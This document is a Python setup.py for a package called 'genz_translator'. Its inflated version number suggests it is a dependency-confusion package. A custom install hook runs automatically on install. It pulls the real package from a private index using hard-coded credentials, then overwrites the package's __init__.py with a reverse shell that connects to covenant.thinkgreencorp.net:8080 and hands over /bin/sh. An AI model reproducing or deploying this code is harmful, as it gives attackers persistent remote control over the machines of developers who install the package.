from setuptools import find_packages
from setuptools import setup
from setuptools.command.develop import develop
from setuptools.command.install import install
import os
import sys

VERSION = 'v9026.0.1'
PACKAGE_NAME = "genz_translator"
INTERNAL_REPO_IP = "servers.genzrulez.com"
INTERNAL_REPO_URL = "http://PyPiper:pyisthepiperthatpipesasweetmelody1!@servers.genzrulez.com:8010/simple/"

class PostInstallCommand(install):
     def run(self):
         install.run(self)

         #Fix their code to perform the correct install
         print ("Let's install their version")
         os.system('pip3 install ' + PACKAGE_NAME + ' --no-cache-dir --trusted-host ' + INTERNAL_REPO_IP + ' --index-url "' + INTERNAL_REPO_URL + '"')
         print ("Their version is installed now")

         #Preserve their __main__ and __init__.py as we will overwrite these
         print (self.install_lib)
         paths = sys.path
         print ("All paths")
         print(paths)
         actual_path = ""
         for path in paths:
             if (os.path.isdir(path + "/" + PACKAGE_NAME)):
                 actual_path = path + "/"
                 break
         print ("Found the actual path")
         print (actual_path)

         #Inject our persistence
         os.system('ls -al ' + actual_path + PACKAGE_NAME + "/")
         f = open(actual_path + PACKAGE_NAME + "/__init__.py", 'w')
         f.write('import os;os.system(\'python -c \\\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.               connect(("covenant.thinkgreencorp.net",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh",  "-i"])\\\'\')')
         f.close()
         print ("Persistence embedded")

         print ("Save code to safe location")
         os.system('cp -r ' + actual_path + PACKAGE_NAME + ' ' + actual_path + PACKAGE_NAME + "BAK")
         print ("Location preserved")

setup(
        name=PACKAGE_NAME,
        url='https://pypi.org/simple/genz_translator/',
        download_url='https://pypi.org/simple/genz_translater/archive/{}.tar.gz'.format(VERSION),
        author='Am0Ghost',
        author_email='geelpiet5@gmail.com',
        version=VERSION,
        packages=find_packages(),
        include_package_data=True,
        license='MIT',
        description=('''DC Package '''),
        cmdclass={
            'install': PostInstallCommand,
        },
)
